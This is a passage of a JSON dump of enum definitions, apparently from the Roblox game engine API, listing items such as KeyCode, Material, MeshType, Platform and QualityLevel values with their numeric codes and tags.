","tags":[],"Value":165,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World6","tags":[],"Value":166,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World7","tags":[],"Value":167,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World8","tags":[],"Value":168,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World9","tags":[],"Value":169,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World10","tags":[],"Value":170,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World11","tags":[],"Value":171,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World12","tags":[],"Value":172,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World13","tags":[],"Value":173,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World14","tags":[],"Value":174,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World15","tags":[],"Value":175,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World16","tags":[],"Value":176,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World17","tags":[],"Value":177,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World18","tags":[],"Value":178,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World19","tags":[],"Value":179,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World20","tags":[],"Value":180,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World21","tags":[],"Value":181,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World22","tags":[],"Value":182,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World23","tags":[],"Value":183,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World24","tags":[],"Value":184,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World25","tags":[],"Value":185,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World26","tags":[],"Value":186,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World27","tags":[],"Value":187,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World28","tags":[],"Value":188,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World29","tags":[],"Value":189,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World30","tags":[],"Value":190,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World31","tags":[],"Value":191,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World32","tags":[],"Value":192,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World33","tags":[],"Value":193,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World34","tags":[],"Value":194,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World35","tags":[],"Value":195,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World36","tags":[],"Value":196,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World37","tags":[],"Value":197,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World38","tags":[],"Value":198,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World39","tags":[],"Value":199,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World40","tags":[],"Value":200,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World41","tags":[],"Value":201,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World42","tags":[],"Value":202,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World43","tags":[],"Value":203,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World44","tags":[],"Value":204,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World45","tags":[],"Value":205,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World46","tags":[],"Value":206,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World47","tags":[],"Value":207,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World48","tags":[],"Value":208,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World49","tags":[],"Value":209,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World50","tags":[],"Value":210,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World51","tags":[],"Value":211,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World52","tags":[],"Value":212,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World53","tags":[],"Value":213,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World54","tags":[],"Value":214,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World55","tags":[],"Value":215,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World56","tags":[],"Value":216,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World57","tags":[],"Value":217,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World58","tags":[],"Value":218,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World59","tags":[],"Value":219,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World60","tags":[],"Value":220,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World61","tags":[],"Value":221,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World62","tags":[],"Value":222,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World63","tags":[],"Value":223,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World64","tags":[],"Value":224,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World65","tags":[],"Value":225,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World66","tags":[],"Value":226,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World67","tags":[],"Value":227,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World68","tags":[],"Value":228,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World69","tags":[],"Value":229,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World70","tags":[],"Value":230,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World71","tags":[],"Value":231,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World72","tags":[],"Value":232,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World73","tags":[],"Value":233,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World74","tags":[],"Value":234,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World75","tags":[],"Value":235,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World76","tags":[],"Value":236,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World77","tags":[],"Value":237,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World78","tags":[],"Value":238,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World79","tags":[],"Value":239,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World80","tags":[],"Value":240,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World81","tags":[],"Value":241,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World82","tags":[],"Value":242,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World83","tags":[],"Value":243,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World84","tags":[],"Value":244,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World85","tags":[],"Value":245,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World86","tags":[],"Value":246,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World87","tags":[],"Value":247,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World88","tags":[],"Value":248,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World89","tags":[],"Value":249,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World90","tags":[],"Value":250,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World91","tags":[],"Value":251,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World92","tags":[],"Value":252,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World93","tags":[],"Value":253,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World94","tags":[],"Value":254,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World95","tags":[],"Value":255,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonX","tags":[],"Value":1000,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonY","tags":[],"Value":1001,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonA","tags":[],"Value":1002,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonB","tags":[],"Value":1003,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonR1","tags":[],"Value":1004,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonL1","tags":[],"Value":1005,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonR2","tags":[],"Value":1006,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonL2","tags":[],"Value":1007,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonR3","tags":[],"Value":1008,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonL3","tags":[],"Value":1009,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonStart","tags":[],"Value":1010,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonSelect","tags":[],"Value":1011,"Enum":"KeyCode"},{"type":"EnumItem","Name":"DPadLeft","tags":[],"Value":1012,"Enum":"KeyCode"},{"type":"EnumItem","Name":"DPadRight","tags":[],"Value":1013,"Enum":"KeyCode"},{"type":"EnumItem","Name":"DPadUp","tags":[],"Value":1014,"Enum":"KeyCode"},{"type":"EnumItem","Name":"DPadDown","tags":[],"Value":1015,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Thumbstick1","tags":[],"Value":1016,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Thumbstick2","tags":[],"Value":1017,"Enum":"KeyCode"},{"type":"Enum","Name":"KeywordFilterType","tags":[]},{"type":"EnumItem","Name":"Include","tags":[],"Value":0,"Enum":"KeywordFilterType"},{"type":"EnumItem","Name":"Exclude","tags":[],"Value":1,"Enum":"KeywordFilterType"},{"type":"Enum","Name":"LeftRight","tags":[]},{"type":"EnumItem","Name":"Left","tags":[],"Value":0,"Enum":"LeftRight"},{"type":"EnumItem","Name":"Center","tags":[],"Value":1,"Enum":"LeftRight"},{"type":"EnumItem","Name":"Right","tags":[],"Value":2,"Enum":"LeftRight"},{"type":"Enum","Name":"LevelOfDetailSetting","tags":[]},{"type":"EnumItem","Name":"High","tags":[],"Value":2,"Enum":"LevelOfDetailSetting"},{"type":"EnumItem","Name":"Medium","tags":[],"Value":1,"Enum":"LevelOfDetailSetting"},{"type":"EnumItem","Name":"Low","tags":[],"Value":0,"Enum":"LevelOfDetailSetting"},{"type":"Enum","Name":"ListenerType","tags":[]},{"type":"EnumItem","Name":"Camera","tags":[],"Value":0,"Enum":"ListenerType"},{"type":"EnumItem","Name":"CFrame","tags":[],"Value":1,"Enum":"ListenerType"},{"type":"EnumItem","Name":"ObjectPosition","tags":[],"Value":2,"Enum":"ListenerType"},{"type":"EnumItem","Name":"ObjectCFrame","tags":[],"Value":3,"Enum":"ListenerType"},{"type":"Enum","Name":"Material","tags":[]},{"type":"EnumItem","Name":"Plastic","tags":[],"Value":256,"Enum":"Material"},{"type":"EnumItem","Name":"Wood","tags":[],"Value":512,"Enum":"Material"},{"type":"EnumItem","Name":"Slate","tags":[],"Value":800,"Enum":"Material"},{"type":"EnumItem","Name":"Concrete","tags":[],"Value":816,"Enum":"Material"},{"type":"EnumItem","Name":"CorrodedMetal","tags":[],"Value":1040,"Enum":"Material"},{"type":"EnumItem","Name":"DiamondPlate","tags":[],"Value":1056,"Enum":"Material"},{"type":"EnumItem","Name":"Foil","tags":[],"Value":1072,"Enum":"Material"},{"type":"EnumItem","Name":"Grass","tags":[],"Value":1280,"Enum":"Material"},{"type":"EnumItem","Name":"Ice","tags":[],"Value":1536,"Enum":"Material"},{"type":"EnumItem","Name":"Marble","tags":[],"Value":784,"Enum":"Material"},{"type":"EnumItem","Name":"Granite","tags":[],"Value":832,"Enum":"Material"},{"type":"EnumItem","Name":"Brick","tags":[],"Value":848,"Enum":"Material"},{"type":"EnumItem","Name":"Pebble","tags":[],"Value":864,"Enum":"Material"},{"type":"EnumItem","Name":"Sand","tags":[],"Value":1296,"Enum":"Material"},{"type":"EnumItem","Name":"Fabric","tags":[],"Value":1312,"Enum":"Material"},{"type":"EnumItem","Name":"SmoothPlastic","tags":[],"Value":272,"Enum":"Material"},{"type":"EnumItem","Name":"Metal","tags":[],"Value":1088,"Enum":"Material"},{"type":"EnumItem","Name":"WoodPlanks","tags":[],"Value":528,"Enum":"Material"},{"type":"EnumItem","Name":"Cobblestone","tags":[],"Value":880,"Enum":"Material"},{"type":"EnumItem","Name":"Air","tags":["notbrowsable"],"Value":1792,"Enum":"Material"},{"type":"EnumItem","Name":"Water","tags":["notbrowsable"],"Value":2048,"Enum":"Material"},{"type":"EnumItem","Name":"Rock","tags":["notbrowsable"],"Value":896,"Enum":"Material"},{"type":"EnumItem","Name":"Glacier","tags":["notbrowsable"],"Value":1552,"Enum":"Material"},{"type":"EnumItem","Name":"Snow","tags":["notbrowsable"],"Value":1328,"Enum":"Material"},{"type":"EnumItem","Name":"Sandstone","tags":["notbrowsable"],"Value":912,"Enum":"Material"},{"type":"EnumItem","Name":"Mud","tags":["notbrowsable"],"Value":1344,"Enum":"Material"},{"type":"EnumItem","Name":"Basalt","tags":["notbrowsable"],"Value":788,"Enum":"Material"},{"type":"EnumItem","Name":"Ground","tags":["notbrowsable"],"Value":1360,"Enum":"Material"},{"type":"EnumItem","Name":"CrackedLava","tags":["notbrowsable"],"Value":804,"Enum":"Material"},{"type":"EnumItem","Name":"Neon","tags":[],"Value":288,"Enum":"Material"},{"type":"EnumItem","Name":"Asphalt","tags":["notbrowsable"],"Value":1376,"Enum":"Material"},{"type":"EnumItem","Name":"LeafyGrass","tags":["notbrowsable"],"Value":1284,"Enum":"Material"},{"type":"EnumItem","Name":"Salt","tags":["notbrowsable"],"Value":1392,"Enum":"Material"},{"type":"EnumItem","Name":"Limestone","tags":["notbrowsable"],"Value":820,"Enum":"Material"},{"type":"EnumItem","Name":"Pavement","tags":["notbrowsable"],"Value":836,"Enum":"Material"},{"type":"Enum","Name":"MembershipType","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"MembershipType"},{"type":"EnumItem","Name":"BuildersClub","tags":[],"Value":1,"Enum":"MembershipType"},{"type":"EnumItem","Name":"TurboBuildersClub","tags":[],"Value":2,"Enum":"MembershipType"},{"type":"EnumItem","Name":"OutrageousBuildersClub","tags":[],"Value":3,"Enum":"MembershipType"},{"type":"Enum","Name":"MeshType","tags":[]},{"type":"EnumItem","Name":"Head","tags":[],"Value":0,"Enum":"MeshType"},{"type":"EnumItem","Name":"Torso","tags":[],"Value":1,"Enum":"MeshType"},{"type":"EnumItem","Name":"Wedge","tags":[],"Value":2,"Enum":"MeshType"},{"type":"EnumItem","Name":"Prism","tags":["deprecated"],"Value":7,"Enum":"MeshType"},{"type":"EnumItem","Name":"Pyramid","tags":["deprecated"],"Value":8,"Enum":"MeshType"},{"type":"EnumItem","Name":"ParallelRamp","tags":["deprecated"],"Value":9,"Enum":"MeshType"},{"type":"EnumItem","Name":"RightAngleRamp","tags":["deprecated"],"Value":10,"Enum":"MeshType"},{"type":"EnumItem","Name":"CornerWedge","tags":["deprecated"],"Value":11,"Enum":"MeshType"},{"type":"EnumItem","Name":"Brick","tags":[],"Value":6,"Enum":"MeshType"},{"type":"EnumItem","Name":"Sphere","tags":[],"Value":3,"Enum":"MeshType"},{"type":"EnumItem","Name":"Cylinder","tags":[],"Value":4,"Enum":"MeshType"},{"type":"EnumItem","Name":"FileMesh","tags":[],"Value":5,"Enum":"MeshType"},{"type":"Enum","Name":"MessageType","tags":[]},{"type":"EnumItem","Name":"MessageOutput","tags":[],"Value":0,"Enum":"MessageType"},{"type":"EnumItem","Name":"MessageInfo","tags":[],"Value":1,"Enum":"MessageType"},{"type":"EnumItem","Name":"MessageWarning","tags":[],"Value":2,"Enum":"MessageType"},{"type":"EnumItem","Name":"MessageError","tags":[],"Value":3,"Enum":"MessageType"},{"type":"Enum","Name":"MouseBehavior","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"MouseBehavior"},{"type":"EnumItem","Name":"LockCenter","tags":[],"Value":1,"Enum":"MouseBehavior"},{"type":"EnumItem","Name":"LockCurrentPosition","tags":[],"Value":2,"Enum":"MouseBehavior"},{"type":"Enum","Name":"MoveState","tags":[]},{"type":"EnumItem","Name":"Stopped","tags":[],"Value":0,"Enum":"MoveState"},{"type":"EnumItem","Name":"Coasting","tags":[],"Value":1,"Enum":"MoveState"},{"type":"EnumItem","Name":"Pushing","tags":[],"Value":2,"Enum":"MoveState"},{"type":"EnumItem","Name":"Stopping","tags":[],"Value":3,"Enum":"MoveState"},{"type":"EnumItem","Name":"AirFree","tags":[],"Value":4,"Enum":"MoveState"},{"type":"Enum","Name":"NameOcclusion","tags":[]},{"type":"EnumItem","Name":"OccludeAll","tags":[],"Value":2,"Enum":"NameOcclusion"},{"type":"EnumItem","Name":"EnemyOcclusion","tags":[],"Value":1,"Enum":"NameOcclusion"},{"type":"EnumItem","Name":"NoOcclusion","tags":[],"Value":0,"Enum":"NameOcclusion"},{"type":"Enum","Name":"NetworkOwnership","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"NetworkOwnership"},{"type":"EnumItem","Name":"Manual","tags":[],"Value":1,"Enum":"NetworkOwnership"},{"type":"Enum","Name":"NormalId","tags":[]},{"type":"EnumItem","Name":"Top","tags":[],"Value":1,"Enum":"NormalId"},{"type":"EnumItem","Name":"Bottom","tags":[],"Value":4,"Enum":"NormalId"},{"type":"EnumItem","Name":"Back","tags":[],"Value":2,"Enum":"NormalId"},{"type":"EnumItem","Name":"Front","tags":[],"Value":5,"Enum":"NormalId"},{"type":"EnumItem","Name":"Right","tags":[],"Value":0,"Enum":"NormalId"},{"type":"EnumItem","Name":"Left","tags":[],"Value":3,"Enum":"NormalId"},{"type":"Enum","Name":"OverrideMouseIconBehavior","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"OverrideMouseIconBehavior"},{"type":"EnumItem","Name":"ForceShow","tags":[],"Value":1,"Enum":"OverrideMouseIconBehavior"},{"type":"EnumItem","Name":"ForceHide","tags":[],"Value":2,"Enum":"OverrideMouseIconBehavior"},{"type":"Enum","Name":"PacketPriority","tags":[]},{"type":"EnumItem","Name":"IMMEDIATE_PRIORITY","tags":[],"Value":0,"Enum":"PacketPriority"},{"type":"EnumItem","Name":"HIGH_PRIORITY","tags":[],"Value":1,"Enum":"PacketPriority"},{"type":"EnumItem","Name":"MEDIUM_PRIORITY","tags":[],"Value":2,"Enum":"PacketPriority"},{"type":"EnumItem","Name":"LOW_PRIORITY","tags":[],"Value":3,"Enum":"PacketPriority"},{"type":"Enum","Name":"PacketReliability","tags":[]},{"type":"EnumItem","Name":"UNRELIABLE","tags":[],"Value":0,"Enum":"PacketReliability"},{"type":"EnumItem","Name":"UNRELIABLE_SEQUENCED","tags":[],"Value":1,"Enum":"PacketReliability"},{"type":"EnumItem","Name":"RELIABLE","tags":[],"Value":2,"Enum":"PacketReliability"},{"type":"EnumItem","Name":"RELIABLE_ORDERED","tags":[],"Value":3,"Enum":"PacketReliability"},{"type":"EnumItem","Name":"RELIABLE_SEQUENCED","tags":[],"Value":4,"Enum":"PacketReliability"},{"type":"Enum","Name":"PartType","tags":[]},{"type":"EnumItem","Name":"Ball","tags":[],"Value":0,"Enum":"PartType"},{"type":"EnumItem","Name":"Block","tags":[],"Value":1,"Enum":"PartType"},{"type":"EnumItem","Name":"Cylinder","tags":[],"Value":2,"Enum":"PartType"},{"type":"Enum","Name":"PathStatus","tags":[]},{"type":"EnumItem","Name":"Success","tags":[],"Value":0,"Enum":"PathStatus"},{"type":"EnumItem","Name":"ClosestNoPath","tags":[],"Value":1,"Enum":"PathStatus"},{"type":"EnumItem","Name":"ClosestOutOfRange","tags":[],"Value":2,"Enum":"PathStatus"},{"type":"EnumItem","Name":"FailStartNotEmpty","tags":[],"Value":3,"Enum":"PathStatus"},{"type":"EnumItem","Name":"FailFinishNotEmpty","tags":[],"Value":4,"Enum":"PathStatus"},{"type":"Enum","Name":"PhysicalPropertiesMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":1,"Enum":"PhysicalPropertiesMode"},{"type":"EnumItem","Name":"Legacy","tags":[],"Value":0,"Enum":"PhysicalPropertiesMode"},{"type":"EnumItem","Name":"New","tags":[],"Value":2,"Enum":"PhysicalPropertiesMode"},{"type":"Enum","Name":"PhysicsReceiveMethod","tags":[]},{"type":"EnumItem","Name":"Direct","tags":[],"Value":0,"Enum":"PhysicsReceiveMethod"},{"type":"EnumItem","Name":"Interpolation","tags":[],"Value":1,"Enum":"PhysicsReceiveMethod"},{"type":"Enum","Name":"PhysicsSendMethod","tags":[]},{"type":"EnumItem","Name":"ErrorComputation","tags":[],"Value":0,"Enum":"PhysicsSendMethod"},{"type":"EnumItem","Name":"ErrorComputation2","tags":[],"Value":1,"Enum":"PhysicsSendMethod"},{"type":"EnumItem","Name":"RoundRobin","tags":[],"Value":2,"Enum":"PhysicsSendMethod"},{"type":"EnumItem","Name":"TopNErrors","tags":[],"Value":3,"Enum":"PhysicsSendMethod"},{"type":"Enum","Name":"Platform","tags":[]},{"type":"EnumItem","Name":"Windows","tags":[],"Value":0,"Enum":"Platform"},{"type":"EnumItem","Name":"OSX","tags":[],"Value":1,"Enum":"Platform"},{"type":"EnumItem","Name":"IOS","tags":[],"Value":2,"Enum":"Platform"},{"type":"EnumItem","Name":"Android","tags":[],"Value":3,"Enum":"Platform"},{"type":"EnumItem","Name":"XBoxOne","tags":[],"Value":4,"Enum":"Platform"},{"type":"EnumItem","Name":"PS4","tags":[],"Value":5,"Enum":"Platform"},{"type":"EnumItem","Name":"PS3","tags":[],"Value":6,"Enum":"Platform"},{"type":"EnumItem","Name":"XBox360","tags":[],"Value":7,"Enum":"Platform"},{"type":"EnumItem","Name":"WiiU","tags":[],"Value":8,"Enum":"Platform"},{"type":"EnumItem","Name":"NX","tags":[],"Value":9,"Enum":"Platform"},{"type":"EnumItem","Name":"Ouya","tags":[],"Value":10,"Enum":"Platform"},{"type":"EnumItem","Name":"AndroidTV","tags":[],"Value":11,"Enum":"Platform"},{"type":"EnumItem","Name":"Chromecast","tags":[],"Value":12,"Enum":"Platform"},{"type":"EnumItem","Name":"Linux","tags":[],"Value":13,"Enum":"Platform"},{"type":"EnumItem","Name":"SteamOS","tags":[],"Value":14,"Enum":"Platform"},{"type":"EnumItem","Name":"WebOS","tags":[],"Value":15,"Enum":"Platform"},{"type":"EnumItem","Name":"DOS","tags":[],"Value":16,"Enum":"Platform"},{"type":"EnumItem","Name":"BeOS","tags":[],"Value":17,"Enum":"Platform"},{"type":"EnumItem","Name":"UWP","tags":[],"Value":18,"Enum":"Platform"},{"type":"EnumItem","Name":"None","tags":[],"Value":19,"Enum":"Platform"},{"type":"Enum","Name":"PlayerActions","tags":[]},{"type":"EnumItem","Name":"CharacterForward","tags":[],"Value":0,"Enum":"PlayerActions"},{"type":"EnumItem","Name":"CharacterBackward","tags":[],"Value":1,"Enum":"PlayerActions"},{"type":"EnumItem","Name":"CharacterLeft","tags":[],"Value":2,"Enum":"PlayerActions"},{"type":"EnumItem","Name":"CharacterRight","tags":[],"Value":3,"Enum":"PlayerActions"},{"type":"EnumItem","Name":"CharacterJump","tags":[],"Value":4,"Enum":"PlayerActions"},{"type":"Enum","Name":"PlayerChatType","tags":[]},{"type":"EnumItem","Name":"All","tags":[],"Value":0,"Enum":"PlayerChatType"},{"type":"EnumItem","Name":"Team","tags":[],"Value":1,"Enum":"PlayerChatType"},{"type":"EnumItem","Name":"Whisper","tags":[],"Value":2,"Enum":"PlayerChatType"},{"type":"Enum","Name":"PoseEasingDirection","tags":[]},{"type":"EnumItem","Name":"Out","tags":[],"Value":1,"Enum":"PoseEasingDirection"},{"type":"EnumItem","Name":"InOut","tags":[],"Value":2,"Enum":"PoseEasingDirection"},{"type":"EnumItem","Name":"In","tags":[],"Value":0,"Enum":"PoseEasingDirection"},{"type":"Enum","Name":"PoseEasingStyle","tags":[]},{"type":"EnumItem","Name":"Linear","tags":[],"Value":0,"Enum":"PoseEasingStyle"},{"type":"EnumItem","Name":"Constant","tags":[],"Value":1,"Enum":"PoseEasingStyle"},{"type":"EnumItem","Name":"Elastic","tags":[],"Value":2,"Enum":"PoseEasingStyle"},{"type":"EnumItem","Name":"Cubic","tags":[],"Value":3,"Enum":"PoseEasingStyle"},{"type":"EnumItem","Name":"Bounce","tags":[],"Value":4,"Enum":"PoseEasingStyle"},{"type":"Enum","Name":"PriorityMethod","tags":[]},{"type":"EnumItem","Name":"LastError","tags":[],"Value":0,"Enum":"PriorityMethod"},{"type":"EnumItem","Name":"AccumulatedError","tags":[],"Value":1,"Enum":"PriorityMethod"},{"type":"EnumItem","Name":"FIFO","tags":[],"Value":2,"Enum":"PriorityMethod"},{"type":"Enum","Name":"PrismSides","tags":[]},{"type":"EnumItem","Name":"3","tags":[],"Value":3,"Enum":"PrismSides"},{"type":"EnumItem","Name":"5","tags":[],"Value":5,"Enum":"PrismSides"},{"type":"EnumItem","Name":"6","tags":[],"Value":6,"Enum":"PrismSides"},{"type":"EnumItem","Name":"8","tags":[],"Value":8,"Enum":"PrismSides"},{"type":"EnumItem","Name":"10","tags":[],"Value":10,"Enum":"PrismSides"},{"type":"EnumItem","Name":"20","tags":[],"Value":20,"Enum":"PrismSides"},{"type":"Enum","Name":"PrivilegeType","tags":[]},{"type":"EnumItem","Name":"Owner","tags":[],"Value":255,"Enum":"PrivilegeType"},{"type":"EnumItem","Name":"Admin","tags":[],"Value":240,"Enum":"PrivilegeType"},{"type":"EnumItem","Name":"Member","tags":[],"Value":128,"Enum":"PrivilegeType"},{"type":"EnumItem","Name":"Visitor","tags":[],"Value":10,"Enum":"PrivilegeType"},{"type":"EnumItem","Name":"Banned","tags":[],"Value":0,"Enum":"PrivilegeType"},{"type":"Enum","Name":"ProductPurchaseDecision","tags":[]},{"type":"EnumItem","Name":"NotProcessedYet","tags":[],"Value":0,"Enum":"ProductPurchaseDecision"},{"type":"EnumItem","Name":"PurchaseGranted","tags":[],"Value":1,"Enum":"ProductPurchaseDecision"},{"type":"Enum","Name":"PyramidSides","tags":[]},{"type":"EnumItem","Name":"3","tags":[],"Value":3,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"4","tags":[],"Value":4,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"5","tags":[],"Value":5,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"6","tags":[],"Value":6,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"8","tags":[],"Value":8,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"10","tags":[],"Value":10,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"20","tags":[],"Value":20,"Enum":"PyramidSides"},{"type":"Enum","Name":"QualityLevel","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level01","tags":[],"Value":1,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level02","tags":[],"Value":2,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level03","tags":[],"Value":3,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level04","tags":[],"Value":4,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level05","tags":[],"Value":5,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level06","tags":[],"Value":6,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level07","tags":[],"Value":7,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level08","tags":[],"Value":8,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level09","tags":[],"Value":9,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level10","tags":[],"Value":10,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level11","tags":[],"Value":11,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level12","tags":[],"Value":12,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level13","tags":[],"Value":13,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level14","tags":[],"Value":14,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level15","tags":[],"Value":15,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level16","tags":[],"Value":16,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level17","tags":[],"Value":17,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level18","tags":[],"Value":18,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level19","tags":[],"Value":19,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level20","tags":[],"Value":20,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level21","tags":[],"Value":21,"Enum":"QualityLevel"},{"type":"Enum","Name":"RenderPriority","tags":[]},{"type":"EnumItem","Name":"First","tags":[],"Value":0,"Enum":"RenderPriority"},{"type":"EnumItem","Name":"Input","tags":[],"Value":100,"Enum":"RenderPriority"},{"type":"EnumItem","Name":"Camera","tags":[],"Value":200,"Enum":"RenderPriority"},{"type":"EnumItem","Name":"Character","tags":[],"Value":300,"Enum":"RenderPriority"},{"type":"EnumItem","Name":"Last","tags":[],"Value":2000,"Enum":"RenderPriority"},{"type":"Enum","Name":"Resolution","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"Resolution"},{"type":"EnumItem","Name":"720x526","tags":[],"Value":1,"Enum":"Resolution"},{"type":"EnumItem","Name":"800x600","tags":[],"Value":2,"Enum":"Resolution"},{"type":"EnumItem","Name":"1024x600","tags":[],"Value":3,"Enum":"Resolution"},{"type":"EnumItem","Name":"1024x768","tags":[],"Value":4,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x720","tags":[],"Value":5,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x768","tags":[],"Value":6,"Enum":"Resolution"},{"type":"EnumItem","Name":"1152x864","tags":[],"Value":7,"Enum":"Resolution"},{"type":"EnumItem","Name":"